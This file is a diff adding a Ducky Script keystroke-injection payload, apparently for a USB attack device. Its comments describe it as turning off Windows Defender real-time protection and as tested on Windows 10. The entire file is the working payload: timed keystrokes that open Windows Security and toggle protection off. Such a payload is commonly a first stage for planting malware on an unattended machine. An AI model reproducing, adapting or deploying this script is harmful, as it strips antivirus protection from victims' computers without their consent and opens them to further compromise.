@@ -1,0 +1,35 @@
+REM Deactivate windows defender
+REM Created by venatus9
+REM A script that turns off windows defender real-time protection
+REM Tested and working on windows 10
+WINDOWS
+DELAY 2000
+STRING windows security
+DELAY 1000
+DOWN
+DELAY 200
+DOWN
+ENTER
+DELAY 2000
+LEFT
+DELAY 200
+UP
+ENTER
+DELAY 100
+TAB
+DELAY 100
+TAB
+DELAY 100
+TAB
+DELAY 100
+TAB
+DELAY 100
+ENTER
+DELAY 100
+SPACE
+DELAY 1000
+TAB
+DELAY 100
+TAB
+DELAY 100
+ENTER
